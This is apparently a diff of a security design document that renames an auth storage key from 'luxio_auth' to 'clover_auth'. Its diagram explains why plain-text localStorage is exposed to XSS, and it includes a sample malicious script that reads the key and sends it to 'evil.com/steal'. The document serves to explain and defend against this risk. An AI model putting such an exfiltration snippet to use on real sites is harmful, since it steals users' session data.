@@ -11,7 +11,7 @@
 │  │                                        │         │
 │  │  authStore.setUser(userData)          │         │
 │  │       ↓                                │         │
-│  │  localStorage.setItem('luxio_auth',   │         │
+│  │  localStorage.setItem('clover_auth',   │         │
 │  │    JSON.stringify({                   │         │
 │  │      id: "123",                       │         │
 │  │      email: "user@example.com",       │         │
@@ -22,7 +22,7 @@
 │  ┌────────────────────────────────────────┐         │
 │  │     localStorage (Plain Text)          │         │
 │  │  ┌──────────────────────────────────┐  │         │
-│  │  │ luxio_auth: {                    │  │         │
+│  │  │ clover_auth: {                    │  │         │
 │  │  │   "id": "123",                   │  │         │
 │  │  │   "email": "user@example.com",   │  │         │
 │  │  │   "name": "John Doe"             │  │         │
@@ -36,7 +36,7 @@
 │  │     Malicious Script (XSS Attack)      │         │
 │  │                                        │         │
 │  │  const data = localStorage             │         │
-│  │    .getItem('luxio_auth');            │         │
+│  │    .getItem('clover_auth');            │         │
 │  │  fetch('https://evil.com/steal', {    │         │
 │  │    body: data                         │         │
 │  │  });                                  │         │
@@ -233,7 +233,7 @@ try {
   // Output: "" (session cookie not visible)
   
   // ❌ FAILS - No auth data in localStorage
-  const auth = localStorage.getItem('luxio_auth');
+  const auth = localStorage.getItem('clover_auth');
   console.log(auth);
   // Output: null
   
